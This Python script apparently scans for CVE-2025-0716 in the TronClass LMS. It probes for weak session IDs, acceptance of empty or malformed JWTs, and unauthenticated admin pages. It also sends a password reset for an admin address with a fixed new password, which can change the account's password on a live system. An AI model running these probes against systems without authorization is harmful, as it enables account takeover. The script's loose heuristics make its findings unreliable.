"""
CVE-2025-0716 Vulnerability Detection Script
Authentication bypass vulnerability detection for TronClass LMS
"""

import requests
import json
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2025-0716 vulnerability
    Authentication bypass and session management vulnerabilities
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2025-0716: Authentication bypass vulnerability in session management',
        'remediation': 'Implement proper session validation and token verification mechanisms'
    }
    
    try:
        # Test for session fixation
        response = session.get(target_url, timeout=30)
        initial_cookies = session.cookies.get_dict()
        
        # Test for weak session tokens
        if 'JSESSIONID' in initial_cookies or 'PHPSESSID' in initial_cookies:
            session_id = initial_cookies.get('JSESSIONID') or initial_cookies.get('PHPSESSID')
            if session_id and len(session_id) < 16:
                result['vulnerable'] = True
                result['evidence'] = f"Weak session ID detected: {session_id}"
        
        # Test for JWT vulnerabilities
        auth_endpoints = ['/api/auth', '/api/login', '/auth/token']
        
        for endpoint in auth_endpoints:
            try:
                # Test with empty JWT
                headers = {'Authorization': 'Bearer '}
                response = session.get(
                    urljoin(target_url, endpoint),
                    headers=headers,
                    timeout=30
                )
                
                if response.status_code == 200:
                    result['vulnerable'] = True
                    result['evidence'] = f"Empty JWT accepted at {endpoint}"
                    break
                
                # Test with malformed JWT
                headers = {'Authorization': 'Bearer invalid.token.here'}
                response = session.get(
                    urljoin(target_url, endpoint),
                    headers=headers,
                    timeout=30
                )
                
                if response.status_code == 200:
                    result['vulnerable'] = True
                    result['evidence'] = f"Malformed JWT accepted at {endpoint}"
                    break
            except:
                continue
        
        # Test for admin panel access without authentication
        admin_endpoints = ['/admin', '/admin/', '/admin/dashboard', '/admin/users']
        
        for endpoint in admin_endpoints:
            try:
                response = session.get(
                    urljoin(target_url, endpoint),
                    timeout=30
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    if any(indicator in content for indicator in ['admin', 'dashboard', 'users', 'settings']):
                        result['vulnerable'] = True
                        result['evidence'] = f"Admin panel accessible without authentication: {endpoint}"
                        break
            except:
                continue
        
        # Test for password reset bypass
        try:
            reset_data = {
                'email': 'admin@tronclass.com',
                'new_password': 'newpassword123'
            }
            
            response = session.post(
                urljoin(target_url, '/password/reset'),
                data=reset_data,
                timeout=30
            )
            
            if response.status_code == 200:
                content = response.text.lower()
                if 'success' in content or 'password changed' in content:
                    result['vulnerable'] = True
                    result['evidence'] = "Password reset bypass vulnerability detected"
        except:
            pass
            
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result